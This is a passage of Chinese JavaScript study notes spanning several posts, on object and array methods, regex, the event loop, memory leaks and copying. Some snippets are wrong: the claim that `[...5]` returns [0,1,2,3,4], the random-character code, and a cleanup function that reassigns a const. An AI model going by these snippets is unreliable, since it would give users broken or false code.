WeakRef 对象，用于直接创建对象的弱引用。\nlet target = {};\nlet wr = new WeakRef(target);\n```\n\n- `WeakRef`：用于直接==创建对象的弱引用==\n- `FinalizationRegistry`：垃圾回收时==回调函数==\n\n## 3. Set 与 WeakSet\n\n- 在 Set 内部，两个 `NaN` 是相等的\n- WeakSet \n\t- 成员**只能是对象**，而不能是其他类型的值\n\t- WeakSet 中的对象都是**弱引用**，即垃圾回收机制不考虑 WeakSet 对该对象的引用\n\t- **只有三个方法** \n\t\t- add、delete、has \n\t- 使用场景案例：\n\t\t- WeakSet 的一个用处，是**储存 DOM 节点**，而不用担心这些节点从文档移除时，会引发内存泄漏\n\n## 4. 自己实现一个 isObject\n\n> 使用 `Object` 包装下\n\n![图片&文件](./files/20241025.png)\n\n## 5. 使用 `Object.prototype.toString.call` 来判断类型 ，如下\n\n```javascript hl:19,7,4\n/*数值：返回[object Number]。\n字符串：返回[object String]。\n布尔值：返回[object Boolean]。\nundefined：返回[object Undefined]。\nnull：返回[object Null]。\n数组：返回[object Array]。\narguments 对象：返回[object Arguments]。\n函数：返回[object Function]。\nError 对象：返回[object Error]。\nDate 对象：返回[object Date]。\nRegExp 对象：返回[object RegExp]。\n其他对象：返回[object Object]。*/\n\nObject.prototype.toString.call(2) // \"[object Number]\"\nObject.prototype.toString.call('') // \"[object String]\"\nObject.prototype.toString.call(true) // \"[object Boolean]\"\nObject.prototype.toString.call(undefined) // \"[object Undefined]\"\nObject.prototype.toString.call(null) // \"[object Null]\"\nObject.prototype.toString.call(Math) // \"[object Math]\"\nObject.prototype.toString.call({}) // \"[object Object]\"\nObject.prototype.toString.call([]) // \"[object Array]\"\n\n'[object Function]'\n```\n\n## 6. 属性描述对象\n\n```javascript hl:3,7,8\n// 6个，如下\n{\n  value: 123,\n  writable: false,\n  enumerable: true,\n  configurable: false,\n  get: undefined,\n  set: undefined\n}\n```\n\n常用方法：\n- Object.getOwnPropertyDescriptor\n- Object.defineProperties\n- Object.definePropertie\n\n>  更多见 [19. 遍历对象的方式](/post/RQXB8tah.html)\n\n## 7. 存取器\n\n```javascript hl:1,15,25,3,17,27\n// 写法一，属性p的configurable和enumerable都为false，从而导致属性p是不可遍历的\nvar obj = Object.defineProperty({}, \"p\", {\n  get: function () {\n    return \"getter\";\n  },\n  set: function (value) {\n    console.log(\"setter: \" + value);\n  },\n});\n\nobj.p; // \"getter\"\nobj.p = 123; // \"setter: 123\"\nobj.p; // 还是 \"getter\"\n\n// 写法二，属性p的configurable和enumerable都为true，因此属性p是可遍历的\nvar obj = {\n  get p() {\n    return \"getter\";\n  },\n  set p(value) {\n    console.log(\"setter: \" + value);\n  },\n};\n\n// 应用，存取器往往用于，属性的值依赖对象内部数据的场合。\nvar obj = {\n  $n: 5,\n  get next() {\n    return this.$n++;\n  },\n  set next(n) {\n    if (n >= this.$n) this.$n = n;\n    else throw new Error(\"新的值必须大于当前值\");\n  },\n};\n\nobj.next; // 5\n\nobj.next = 10;\nobj.next; // 10\n\nobj.next = 5;\n// Uncaught Error: 新的值必须大于当前值\n\n```\n\n## 8. 有哪些控制对象状态的方法\n\n```javascript\n// Object.preventExtensions 方法可以使得一个对象无法再添加新的属性。\n// Object.isExtensible 方法用于检查一个对象是否使用了Object.preventExtensions方法\n// Object.seal  方法使得一个对象既无法添加新属性，也无法删除旧属性。可以允许修改\n// Object.isSealed  方法用于检查一个对象是否使用了Object.seal方法。\n// Object.freeze  方法可以使得一个对象无法添加新属性、无法删除旧属性、也无法改变属性的值，使得这个对象实际上变成了常量。\n// Object.isFrozen  方法用于检查一个对象是否使用了Object.freeze方法。\n```\n\n## 9. 使用 `Object.assign` 来实现继承\n\n```javascript hl:9\nObject.assign(SomeClass.prototype, {\n  someMethod(arg1, arg2) {\n    // ···\n  },\n  anotherMethod() {\n    // ···\n  },\n});\n// 等同于下面的写法\nSomeClass.prototype.someMethod = function (arg1, arg2) {\n  // ···\n};\nSomeClass.prototype.anotherMethod = function () {\n  // ···\n};\n\n```\n\n## 10. `Object.fromEntries()`方法是`Object.entries()`的逆操作\n\n```javascript\n// Object.fromEntries()方法是Object.entries()的逆操作\nObject.fromEntries([\n  ['foo', 'bar'],\n  ['baz', 42]\n])\n// { foo: \"bar\", baz: 42 }\n```\n\n## 11. concat 只能解析一层，再一层就不会打平了\n\n![图片&文件](./files/20241025-1.png)\n\n## 12. array 的 reverse 方法是原地的\n\n>  注意 字符串并没有 `reverse` 方法\n\n## 13. slice() 方法的一个重要应用，是将**类似数组的对象**转为**真正的数组**\n\n```javascript\n// slice()方法的一个重要应用，是将类似数组的对象转为真正的数组。\n\nArray.prototype.slice.call({ 0: 'a', 1: 'b', length: 2 })\n// ['a', 'b']\n\nArray.prototype.slice.call(document.querySelectorAll(\"div\"));\nArray.prototype.slice.call(arguments);\n```\n\n>  简写 `[].slice.call`\n\n## 14. sort 方法是原地的\n\n```javascript hl:3,14,23,26\n// sort方法对数组成员进行排序\n// 默认是按照字典顺序排序。\n// 排序后，原数组将被改变。\n['d', 'c', 'b', 'a'].sort(); // ['a', 'b', 'c', 'd']\n\n[4, 3, 2, 1].sort()  // [1, 2, 3, 4]\n\n[11, 101].sort()  // [101, 11]\n\n[10111, 1101, 111].sort()  // [10111, 1101, 111]\n\n// sort的参数函数本身接受两个参数，表示进行比较的两个数组成员。\n// 如果该函数的返回值大于0，表示第一个成员排在第二个成员后面；\n// 其他情况下 <=0 ，都是第一个元素排在第二个元素前面。\n\n \n[10111, 1101, 111].sort(function (a, b) {\n  return a - b;\n}) // [111, 1101, 10111]\n\n// 自定义的排序函数应该返回数值，否则不同的浏览器可能有不同的实现，不能保证结果都一致。\n// bad \n// 甚至有可能完全出错，不知道什么玩意\n[1, 4, 2, 6, 0, 6, 2, 6].sort((a, b) => a > b)\n\n// good\n[1, 4, 2, 6, 0, 6, 2, 6].sort((a, b) => a - b)\n\n```\n\n![图片&文件](./files/20241115-7.png)\n\n## 15. sort((a, b) => a - b > 0) 和 sort((a, b) => a - b) 的区别 ？\n\n这两种写法有**很大的区**别：\n1. `sort((a, b) => a - b)`：\n    - 返回值是具体的差值（数字）\n    - 返回负数：表示 a 应该在 b 前面\n    - 返回 0：表示 a 和 b 相等\n    - 返回正数：表示 a 应该在 b 后面\n    - 结果：==升序排列==\n    - 例如：当 a=3, b=1 时，返回 2（数字）\n2. `sort((a, b) => a - b > 0)`：\n    - 返回值是布尔值转换后的数字（==0 或 1==）\n    - 返回 false (0)：当 a-b ≤ 0 时\n    - 返回 true (1)：当 a-b > 0 时\n    - 结果：\n        - **也不一定，自己的理解的那种，比如**\n            - ![图片&文件](./files/20241115-7.png)\n            - 例如：当 a=3, b=1 时，返回 true（转为数字就是 1）\n\n### 15.1. 返回值类型不同\n\n   ```javascript\n// a=3, b=1 时\n(a - b)     // 返回 2 (数字)\n(a - b > 0) // 返回 true (布尔值，转为数字 1)\n   ```\n\n### 15.2. 排序结果不同\n\n   ```javascript hl:3\n[3,1,2].sort((a,b) => a-b)      // [1,2,3] (升序)\n\n// 并不是降序的，下面的是错误的,而是完全没变\n[3,1,2].sort((a,b) => a-b > 0)  \n   ```\n\n### 15.3. 性能影响\n\n   ```javascript\n// a-b 直接返回差值\nsort((a,b) => a-b)     // 一次运算\n\n// a-b > 0 需要先计算差值再比较\nsort((a,b) => a-b > 0) // 两次运算\n   ```\n\n### 15.4. 最佳实践建议\n\n#### 15.4.1. 对于数字排序，推荐使用 `sort((a, b) => a - b)`\n\n   ```javascript\n// ✅ 好的写法\nnumbers.sort((a, b) => a - b)     // 升序\nnumbers.sort((a, b) => b - a)     // 降序\n   ```\n\n#### 15.4.2. 避免使用 `sort((a, b) => a - b > 0)`\n\n   ```javascript\n// ❌ 不推荐的写法\nnumbers.sort((a, b) => a - b > 0)  // 不够直观，且性能略差，结果还不一定\n   ```\n\n#### 15.4.3. 如果确实需要布尔值比较，直接使用比较运算符\n\n   ```javascript hl:8\n// 如果一定要用布尔值比较\nnumbers.sort((a, b) => a > b ? 1 : -1)\n\n\n// 比如\nlet arr = [1, 4, 2, 6, 0, 6, 2, 6];\n\narr.sort((a, b) => (a > b ? 1 : -1));\n\nconsole.log(arr);\n\n   ```\n\n### 15.5. 总结\n\n- `a - b` 写法更清晰、更准确、性能更好\n- `a - b > 0` 有问题，很大的问题\n- 在实际开发中\n\t- 使用 `a - b` 的写法\n\t- 不要使用 `a > b`\n\n## 16. map()方法还可以接受第二个参数\n\n注意下面的 `this`\n\n```javascript hl:3\n// map()方法还可以接受第二个参数\nvar arr = ['a', 'b', 'c'];\n// map()方法的第二个参数，将回调函数内部的this对象，指向 arr 数组\n[1, 2].map(function (e) {\n  return this[e];\n}, arr)\n// ['b', 'c']\n```\n\n## 17. forEach也接受两个参数\n\n>  注意下面的 `this`\n\n```javascript hl:4,7\nvar out = [];\n\n[1, 2, 3].forEach(function(elem) {\n  this.push(elem * elem);\n}, out);\n\nout // [1, 4, 9]\n```\n\n## 18. 扩展运算法\n\n```javascript hl:17,31,38,57\nconsole.log(...[1, 2, 3])\n// 1 2 3\n\nconsole.log(1, ...[2, 3, 4], 5)\n// 1 2 3 4 5\n\nfunction add(x, y) {\n  return x + y;\n}\n\nconst numbers = [4, 38];\nadd(...numbers) // 42\n\n[...[], 1]\n// [1]\n\n注意，只有函数调用时，扩展运算符才可以放在圆括号中，否则会报错。\n\n(...[1, 2])\n// Uncaught SyntaxError: Unexpected number\n\nconsole.log((...[1, 2]))\n// Uncaught SyntaxError: Unexpected number\n\nconsole.log(...[1, 2])\n// 1 2\n\n// ES5 的写法\nMath.max.apply(null, [14, 3, 77])\n// ES6 的写法\nMath.max(...[14, 3, 77])\n// 等同于\nMath.max(14, 3, 77);\n\nconsole.log([...5]) // [0, 1, 2, 3, 4]\n\n// 扩展运算符还可以将字符串转为真正的数组。\n[...'hello']\n// [ \"h\", \"e\", \"l\", \"l\", \"o\" ]\n\nlet map = new Map([\n  [1, 'one'],\n  [2, 'two'],\n  [3, 'three'],\n]);\n\nlet arr = [...map.keys()]; // [1, 2, 3]\n\nconst go = function*(){\n  yield 1;\n  yield 2;\n  yield 3;\n};\n\n[...go()] // [1, 2, 3]\n\n// 如果对没有 Iterator 接口的对象，使用扩展运算符，将会报错。\n\nconst obj = {a: 1, b: 2};\nlet arr = [...obj]; // TypeError: Cannot spread non-iterable object\n\n```\n\n> [!danger]\n> 扩展运算符还可以将字符串转为真正的数组，`[...'hello']` 或者 `Array.from('hello')`，所以也可以不使用 `split`\n\n## 19. `Array.from()`方法用于将两类对象转为真正的数组\n\n- 类似数组的对象（array-like object）\n\t- NodeList 对象：document.querySelectorAll('p')\n\t- arguments 对象\n- 可遍历（iterable）的对象\n\t- Map\n\n## 20. `Array.of()` 方法用于`将一组值`，转换为数组\n\n>  **array of xxx ：xxx 的数组形式， 这样好理解**\n\n```javascript hl:5\nArray.of(3, 11, 8); // [3,11,8]\nArray.of(3); // [3]\nArray.of(); // []\n\n// 垫片\nfunction ArrayOf(){\n  return [].slice.call(arguments);\n}\n```\n\n## 21. indexOf 与 includes\n\n```javascript\n[NaN].indexOf(NaN)\n// -1\n\n// includes使用的是不一样的判断算法，就没有这个问题。\n[NaN].includes(NaN)\n// true\n```\n\n## 22. 打平一个数组\n\n```javascript hl:7\n[1, 2, [3, 4]].flat()\n// [1, 2, 3, 4]\n\n[1, 2, [3, [4, 5]]].flat()\n// [1, 2, 3, [4, 5]]\n\n// flat()的参数为2，表示要“拉平”两层的嵌套数\n[1, 2, [3, [4, 5]]].flat(2)\n// [1, 2, 3, 4, 5]\n```\n\n>  `arr.flat(Infinity)` 彻底打平\n\n## 23. Array.fill\n\n```javascript hl:5,10\n['a', 'b', 'c'].fill(7)  // [7, 7, 7]\n\nnew Array(3).fill(7)   // [7, 7, 7]\n\nfill方法：还可以接受第二个和第三个参数，用于指定填充的起始位置和结束位置。\n\n['a', 'b', 'c'].fill(7, 1, 2)\n// ['a', 7, 'c']\n\n如果填充的类型为对象，那么被赋值的是同一个内存地址的对象，而不是深拷贝对象。\n\nlet arr = new Array(3).fill({name: \"Mike\"});\narr[0].name = \"Ben\";\narr\n// [{name: \"Ben\"}, {name: \"Ben\"}, {name: \"Ben\"}]\n```\n\n## 24. JSON.stringify 和 JSON.parse 可接受额外参数\n\n## 25. String对象\n\n- `'a'.concat('b', 'c') // \"abc\"`\n- `split方法`还可以接受**第二个参数**，限定返回数组的最大成员数\n- `indexOf方法`还可以接受第二个参数，表示从该位置开始向后匹配\n- `at()`方法接受一个整数作为参数，返回参数指定位置的字符，支持负索引（即倒数的位置）\n\n## 26. Math 对象\n\n```javascript hl:4,5,7\nMath.max(2, -1, 5) // 5\nMath.min(2, -1, 5) // -1\n\nMath.min() // Infinity\nMath.max() // -Infinity\n\n反过来了，为什么呢？？？？\n```\n\n## 27. 返回 `[min,max]` 之间的随机整数\n\n```javascript\nMath.floor(Math.random() * (max - min + 1)) + min;\n```\n\n## 28. 返回一个随机字符\n\n```javascript\n// 字符\nvar str = \"ABCDEFGHIJKLMNOPQRSTUVWXYZ\" + \"abcdefghijklmnopqrstuvwxyz\" + \"0123456789-_\";\n\n// 随机数\nlet random = Math.random(Math.floor() * str.length);\n\n// 随机字符串\nlet randomStr = str[random];\n```\n\n## 29. 正则\n\n### 29.1. 定义\n\n```javascript\nvar regex = /xyz/;\nvar regex = new RegExp(\"xyz\");\n\nvar regex = new RegExp(\"xyz\", \"i\");\n// 等价于\nvar regex = /xyz/i;\n\n\nvar r = /abc/gim;\n\nr.ignoreCase; // true\nr.global; // true\nr.multiline; // true\nr.flags; // 'gim'\n```\n\n### 29.2. replace 的使用\n\n```javascript hl:12\nvar prices = {\n  p1: \"$1.99\",\n  p2: \"$9.99\",\n  p3: \"$5.00\",\n};\n\nvar template =\n  '<span id=\"p1\"></span>' + '<span id=\"p2\"></span>' + '<span id=\"p3\"></span>';\n\ntemplate.replace(\n  /(<span id=\")(.*?)(\">)(<\\/span>)/g,\n  // 参数分别为：匹配到的字符串、第一个括号匹配到的内容、第二个括号匹配到的内容、第三个括号匹配到的内容、第四个括号匹配到的内容\n  function (match, $1, $2, $3, $4) {\n    return $1 + $2 + $3 + prices[$2] + $4;\n  },\n);\n// <span id=\"p1\">$1.99</span>\n// <span id=\"p2\">$9.99</span>\n// <span id=\"p3\">$5.00</span>\n\n```\n\n### 29.3. 自己不熟的\n\n```javascript hl:5,11,35\n/cat|dog/.test('cat') // true\n\n// 字符串bbc news包含a、b、c以外的其他字符，所以返回true\n/[^abc]/.test('bbc news') // true\n// 字符串bbc不包含a、b、c以外的其他字符，所以返回false\n/[^abc]/.test('bbc') // false\n\n[0-9.,]\n[0-9a-fA-F]\n[a-zA-Z0-9-]\n[1-31] // 不代表1到31，只代表1到3\n\n重复类\n/lo{2}k/.test('look') // true\n/lo{2,5}k/.test('looook') // true\n\n贪婪模式\n// t 出现0次或1次\n/t?est/.test('test') // true\n/t?est/.test('est') // true\n\n// t 出现1次或多次\n/t+est/.test('test') // true\n/t+est/.test('tttttttttttttest') // true\n/t+est/.test('est') // false\n\n// t 出现0次或多次\n/t*est/.test('test') // true\n/t*est/.test('ttttttttest') // true\n/t*est/.test('tttest') // true\n/t*est/.test('tttttttttttttttttest') // true\n\n+?：表示某个模式出现1次或多次，匹配时采用非贪婪模式\n*?：表示某个模式出现0次或多次，匹配时采用非贪婪模式\n??：表格某个模式出现0次或1次，匹配时采用非贪婪模式\n\n(?:x)称为 非捕获组\n\nx(?=y) 称为先行断言，x 只有在y 前面才匹配，y 不会被计入返回结果\nx(?!y) 称为先行否定断言，x只有不在y前面才匹配，y 不会被计入返回结果\n```\n\n\n> 后面加个 `?` 匹配使用非贪婪模式","SkcUTZLY":"\n# JavaScript 的单线程\n\n`#javascript` `#R2` \n\n\n## 目录\n<!-- toc -->\n ## 1. 前置知识：单核、多核、进程、线程、互斥锁、信号量、并发、并行 \n\n### 1.1. 单核与多核\n\n- 想象一个工厂的**生产线**：\n\t- 单核 CPU：\n\t\t- 就像一条生产线**只有一个工人**。这个工人需要一个接一个地完成所有任务。\n\t- 多核 CPU：\n\t\t- 相当于一条生产线上**有多个工人**。每个工人（核心）可以同时处理不同的任务，大大提高了整体效率。\n\n### 1.2. 进程\n\n把进程想象成一个**独立的烹饪项目**。\n- 每个进程都有自己的\n\t- \"厨房\"（**内存空间**）\n\t- \"食材\"（**资源**）。\n- 比如，**同时烤蛋糕和煮汤**\n\t- 这两个就可以看作是两个不同的**进程**。\n\n### 1.3. 线程\n\n- 如果**进程**是一个烹饪项目\n\t- 那么**线程**就是完成这个项目的**具体步骤**。\n\t\t- 一个进程可以包含多个线程\n\t\t\t- 就像烤蛋糕这个进程可能包含\"搅拌面糊\"、\"预热烤箱\"、\"倒入模具\"等多个步骤（线程）。\n\t\t\t- 这些步骤可以由一个厨师轮流进行，也可以由多个助手同时进行。\n\n### 1.4. 互斥锁\n\n- 想象一把**钥匙**，用来锁住一个**资源**。\n- 当一个线程需要使用这个资源时，它必须先获得这把钥匙。\n- 使用完后，它会归还钥匙，让其他线程使用。\n- 这就保证了在任何时刻，只有一个线程能访问这个资源，防止了资源的混乱使用。\n\n例如，在厨房里**只有一个烤箱**。当一个厨师在使用烤箱时，他会\"锁住\"烤箱，其他厨师就需要等待，直到烤箱空闲。\n\n### 1.5. 信号量\n\n信号量可以看作是一个**管理员**，控制着可同时访问某个资源的线程数量。\n\n想象一个**停车场**，信号量就像是负责管理车位的工作人员：\n\n- 如果还有空位（资源可用），他会允许车辆（线程）进入。\n- 如果车位已满（资源耗尽），他会要求新来的车辆等待。\n- 当有车离开时（资源被释放），他会允许等待的车辆进入。\n\n**信号量比互斥锁更灵活**，因为它可以允许多个线程同时访问资源，而不仅仅是一个。\n\n### 1.6. 并发与并行\n\n- 并发：\n\t- 在`单核CPU`上，通过**快速切换不同的任务**，\n\t- 给人一种\"同时\"进行的**错觉**。\n\t- 就像一个厨师快速地在烤蛋糕和煮汤之间切换工作\n- 并行：\n\t- 在`多核CPU`上，不同的核心可以真正同时执行不同的任务。\n\t- 就像**多个厨师**在同一时间分别处理不同的菜品\n\n### 1.7. 总结\n\n操作系统的设计，因此可以归结为三点\n\n- 以`多进程`形式，允许多个任务同时运行；\n- 以`多线程`形式，允许单个任务分成不同的部分运行；\n- **提供**`协调机制`\n\t- 一方面防止进程之间和线程之间产生冲突\n\t- 另一方面允许进程之间和线程之间共享资源\n\n### 1.8. 进程与线程的主要区别\n\n1. `进程`要分配**一大部分的**`内存`，而`线程`只需要分配`一部分栈`就可以了.\n2. 一个 `程序`至少有一个`进程`, 一个`进程`至少有一个`线程`.\n3. `进程`是**资源分配的最小单位**，`线程`是程序`执行的最小单位`。\n4. 一个`线程`可以创建和撤销另一个`线程`，同一个`进程`中的多个`线程`之间可以**并发执行**.\n\n## 2. 如何理解 JavaScript 的单线程？\n\n### 2.1. 历史原因\n\nJavaScript 最初是为了在浏览器中操作 DOM 而设计的\n\n### 2.2. 如果是多线程的\n\n一个线程在某个DOM节点上添加内容，另一个线程删除了这个节点，这时浏览器应该以哪个线程为准\n\n### 2.3. 缺点\n\n- 性能限制：\n\t- 在处理 CPU 密集型任务时，可能会导致页面卡顿\n- 不能充分利用多核 CPU 的优势\n- 可靠性较低：\n\t- 如果某个任务崩溃，可能会影响整个应用程序\n\n### 2.4. 如何克服单线程的限制\n\n- 事件循环和异步编程：\n\t- JavaScript 使用事件循环（Event Loop）和回调函数来处理异步操作\n- Web Workers : \n\t- 可以新开线程\n- 异步 API：\n\t- 许多浏览器 API 和 Node.js API 都是异步的，允许非阻塞操作\n- 服务器端解决方案：\n\t- 在 Node.js 环境中，可以使用**集群（Cluster）模块**或 **PM2** 等**进程管理工具**来创建多个进程，充分利用多核 CPU\n\n### 2.5. Web Worker 线程\n\n- 允许 JavaScript 脚本创建多个线程\n\t- 但是子线程完全受主线程控制，且不得操作DOM\n- 这个新标准**并没有改变 JavaScript 单线程的本质** \n\n## 3. 事件循环与**消息队列**\n\n>  事件循环 和 消息队列 是两个独立的概念\n\n- ==消息队列==\n\t- 比如 Ajax 请求完后把消息放到消息队队列里，特定时间去消息队列取，然后执行的\n\n\n- **消息队列：** 消息队列是一个先进先出的 `队列`，它里面存放着各种消息\n- **事件循环：** \n\t- 事件循环是指 `主线程` 重复从**消息队列**中==取消息、执行==的过程\n\t- **事件循环** \n\t\t- 是 JavaScript 引擎等待任务、执行任务和进入休眠状态等待更多任务的一种机制\n\t- JavaScript 是单线程的，**事件循环**使得它能够==非阻塞地执行 I/O 操作==\n\n![图片&文件](./files/20241025-3.png)\n\n类似于下面代码：\n\n```javascript\nwhile(true) {     \n  var message = queue.shift();     \n  execute(message); \n}\n```\n\n## 4. 宏任务与微任务\n\n```javascript hl:1\n即 同步代码，一个宏任务，所有微任务，一个宏任务，所有微任务......\nwhile (true) {\n  宏任务队列.shift()\n  微任务队列全部任务()\n}\n```\n\n- 谁发起的\n\t- 宏任务：由宿主（Node 或者 浏览器）发起\n\t- 微任务：js 引擎发起\n- 微任务是宏任务的组成部分，不能分开谈\n- DOM 操作是同步任务\n- `window.requestAnimationFrame()` 不能算宏任务也不能算微任务，而是一个**特定时机**\n\t- 你希望执行一个动画，并且要求浏览器在**下次重绘之前**调用指定的回调函数更新动画\n\t- 执行时机是在当前宏任务范围内, 执行完**同步代码和微任务队列后再执行**\n\t\t- 它仍然属于宏任务范围内，但是是**在微任务队列执行完毕后才执行**\n- 常见的**宏任务**包括：\n\t- **script（整体代码**）\n\t- setTimeout/setInterval\n\t- I/O\n\t- UI 渲染\n\t- postMessage\n\t- setImmediate（Node.js 环境）\n- 常见的微任务包括：\n\t- `Promise.then/catch/finally`\n\t- process.nextTick（Node.js 环境）\n\t- **MutationObserver**\n\t- queueMicrotask()\n- 执行顺序：\n\t- a. 执行同步代码，这属于宏任务\n\t- b. 执行栈为空，查询是否有微任务需要执行\n\t- c. 执行所有微任务\n\t- d. **必要的话进行 UI 渲染**\n\t\t- ==所有微任务完成后，进行 UI 渲染==\n\t\t\t- 所以，则可以结合 `vue - watch -  post` 或者 `React - useLayoutEffect` 来思考，一些原理性问题\n\t- e. 然后开始下一轮事件循环，执行宏任务中的异步代码\n\n### 4.1. Node.js 版本（v12 及以后）与浏览器环境中宏任务和微任务的区别\n\n- 事件循环的基本结构：\n\t- 浏览器：\n\t\t- 事件循环==相对简单==，主要包括==宏任务队列==和==微任务队列==\n\t- Node.js：\n\t\t- 事件循环==更复杂==，包含**多个阶段**（timers、pending callbacks、idle、prepare、poll、check、close callbacks）\n- 宏任务和微任务的执行顺序\n\t- 都是在每个宏任务执行完毕后，会立即执行所有微任务\n- Node.js 中的 `process.nextTick` 是一个特殊的微任务，**它的优先级高于其他微任务**。\n\t- 在每个阶段结束时，如果存在 nextTick 队列，会优先执行完 nextTick 队列中的所有任务，然后才会执行其他微任务\n- Nodejs 中 ：\n\t- 同步任务 > `process.nextTick()` > 微任务\n- 如果在一个 I/O 周期内调用\n\t- `setImmediate` 总是先于 setTimeout 执行，否则大概率是 setTimeout 先执行\n\n### 4.2. Node.js 的事件循环主要分为 6 个阶段（phases）\n\n>  定时器阶段、空闲阶段、关闭回调阶段等\n\n按照执行顺序依次是：\n\n1. **timers（定时器阶段）**\n   - 执行 `setTimeout` 和 `setInterval` 的回调函数\n   - 检查是否有到期的定时器，如果有则执行对应的回调函数\n2. **pending callbacks（待定回调阶段）**\n   - 执行延迟到下一个循环迭代的 I/O 回调\n   - 处理上一轮循环中未执行的 I/O 回调\n3. **idle, prepare（空闲、准备阶段）**\n   - 仅系统内部使用\n   - 开发者一般不需要关注这个阶段\n4. **poll（轮询阶段）**\n   - 检索新的 I/O 事件\n   - 执行与 I/O 相关的回调\n   - 如果有到期的定时器，则结束 poll 阶段\n   - 如果有 `setImmediate` 回调需要执行，则结束 poll 阶段\n5. **check（检查阶段）**\n   - 执行 `setImmediate` 的回调函数\n   - 在 poll 阶段空闲时立即执行\n6. **close callbacks（关闭回调阶段）**\n   - 执行关闭事件的回调函数\n   - 例如 `socket.on('close', ...)` 的回调\n","fec8TVhp":"\n# JavaScript 内存泄漏场景及其解决方案\n\n`#javascript` \n\n\n## 目录\n<!-- toc -->\n ## 1. 闭包导致的内存泄漏 → cleanup \n\n```javascript hl:2\nfunction createClosure() {\n  const largeData = new Array(1000000);  // 一个大数组\n  \n  return function() {\n    // 这个内部函数引用了外部的 largeData\n    console.log(largeData.length);\n  }\n}\n\n// 创建闭包\nconst closure = createClosure();  // largeData 会一直保留在内存中\n```\n\n解决方案：`cleanup 函数`\n\n```javascript hl:9\nfunction createClosure() {\n  const largeData = new Array(1000000);\n  \n  const result = function() {\n    console.log(largeData.length);\n  }\n  \n  // 使用完后手动解除引用\n  result.cleanup = function() {\n    largeData = null;\n  }\n  \n  return result;\n}\n\nconst closure = createClosure();\n// 使用完后调用清理方法\nclosure.cleanup();\n```\n\n>  其实在函数式编程里，`cleanup` 使用场景很多，比如 Vue watch 的 cleanup 、React 的 useEffect 的返回值（clearup）\n\n## 2. 事件监听器未移除：==一般都是再返回一个函数==\n\n```javascript\nfunction addHandler() {\n  const element = document.getElementById('button');\n  element.addEventListener('click', () => {\n    // 处理点击事件\n    doSomething();\n  });\n}\n\n// 每次调用都会添加新的事件监听器，而不会移除旧的\naddHandler();\naddHandler();\n```\n\n解决方案：\n\n```javascript hl:10\nfunction addHandler() {\n  const element = document.getElementById('button');\n  const handler = () => {\n    doSomething();\n  };\n  \n  element.addEventListener('click', handler);\n  \n  // 在适当的时机移除事件监听器\n  return () => {\n    element.removeEventListener('click', handler);\n  };\n}\n\nconst removeHandler = addHandler();\n// 不需要时移除监听器\nremoveHandler();\n```\n\n## 3. 定时器未清除：→ 返回回清理函数\n\n```javascript\nfunction startTimer() {\n  const data = { /* 一些数据 */ };\n  \n  setInterval(() => {\n    // 使用 data 进行操作\n    console.log(data);\n  }, 1000);\n}\n\n// 定时器会一直运行，data 对象无法被垃圾回收\nstartTimer();\n```\n\n解决方案：\n\n```javascript hl:9\nfunction startTimer() {\n  const data = { /* 一些数据 */ };\n  \n  const timerId = setInterval(() => {\n    console.log(data);\n  }, 1000);\n  \n  // 返回清理函数\n  return () => {\n    clearInterval(timerId);\n  };\n}\n\nconst stopTimer = startTimer();\n// 在适当的时候停止定时器\nstopTimer();\n```\n\n## 4. DOM 引用\n\n```javascript\nconst elements = {\n  button: document.getElementById('button'),\n  image: document.getElementById('image'),\n  text: document.getElementById('text')\n};\n\n// 即使元素从 DOM 中移除，仍然保留在内存中\nfunction removeButton() {\n  document.body.removeChild(document.getElementById('button'));\n  // elements.button 仍然引用着已删除的 DOM 元素\n}\n```\n\n解决方案：\n\n```javascript hl:9\nconst elements = {\n  button: document.getElementById('button'),\n  image: document.getElementById('image'),\n  text: document.getElementById('text')\n};\n\nfunction removeButton() {\n  document.body.removeChild(document.getElementById('button'));\n  // 移除引用\n  elements.button = null;\n}\n```\n\n## 5. 全局变量\n\n```javascript hl:2,7\nfunction createGlobalVar() {\n  // 意外创建全局变量\n  leakedVariable = 'I am leaked';  // 没有使用 var/let/const\n}\n\n// 或者\nwindow.globalVar = { /* 大量数据 */ };\n```\n\n解决方案：\n\n```javascript\nfunction createGlobalVar() {\n  // 使用严格模式\n  'use strict';\n  \n  // 现在这会抛出错误而不是创建全局变量\n  leakedVariable = 'I am leaked';  // ReferenceError\n  \n  // 正确的声明方式\n  const localVar = 'I am local';\n}\n\n// 如果确实需要全局变量，在使用完后记得清理\nwindow.globalVar = { /* 大量数据 */ };\n// 使用完后\nwindow.globalVar = null;\n```\n\n## 6. 缓存未清理：→ 设置缓存时间\n\n> 最大缓存值\n> 最近缓存值\n\n```javascript\nconst cache = new Map();\n\nfunction addToCache(key, value) {\n  cache.set(key, value);\n}\n\n// 缓存不断增长，没有清理机制\n```\n\n解决方案：\n\n```javascript\nclass Cache {\n  constructor(maxSize = 100) {\n    this.cache = new Map();\n    this.maxSize = maxSize;\n  }\n  \n  set(key, value) {\n    if (this.cache.size >= this.maxSize) {\n      // 删除最早的项目\n      const firstKey = this.cache.keys().next().value;\n      this.cache.delete(firstKey);\n    }\n    this.cache.set(key, value);\n  }\n  \n  clear() {\n    this.cache.clear();\n  }\n}\n\nconst cache = new Cache(100);\n```\n\n## 7. 使用 Map 而未使用 WeakMap/WeakSet 的场景\n\n当需要在对象上存储额外数据时，使用 `WeakMap` 可以防止内存泄漏：\n\n```javascript\n// 不好的做法\nconst cache = new Map();\n\nfunction process(obj) {\n  cache.set(obj, { /* some data */ });  // obj 的引用会被保留\n}\n\n// 好的做法\nconst cache = new WeakMap();\n\nfunction process(obj) {\n  cache.set(obj, { /* some data */ });  // 当 obj 不再被使用时，缓存数据会被自动清理\n}\n```\n\n## 8. 最佳实践\n\n- **使用严格模式**：\n\t- 避免意外创建全局变量\n- **及时清理**：\n\t- 清除定时器\n\t- 移除事件监听器\n\t- 解除 DOM 引用\n- **使用 WeakMap/WeakSet**：\n\t- 存储对象引用\n- **实现清理机制**：\n\t- 为长期运行的程序实现缓存清理\n- **开发工具**：\n   - 使用 Chrome DevTools 的 Memory 面板\n   - 使用内存分析工具定期检查\n- **代码审查**：关注可能造成内存泄漏的代码模式\n","zE13ZZdw":"\n# 深拷贝与浅拷贝\n\n`#javascript` \n\n\n## 目录\n<!-- toc -->\n ## 1. 常见的浅拷贝方式 \n\n```javascript\nfunction shadowCopy(obj) {\n  const newObj = {};\n  for (let prop in obj) {\n    if (obj.hasOwnProperty(prop)) {\n      newObj[prop] = obj[prop];\n    }\n  }\n  return newObj;\n}\n\nObject.assign({}, {});\n\nArray.prototype.slice();\n\nArray.prototype.concat();\n\nlet a = 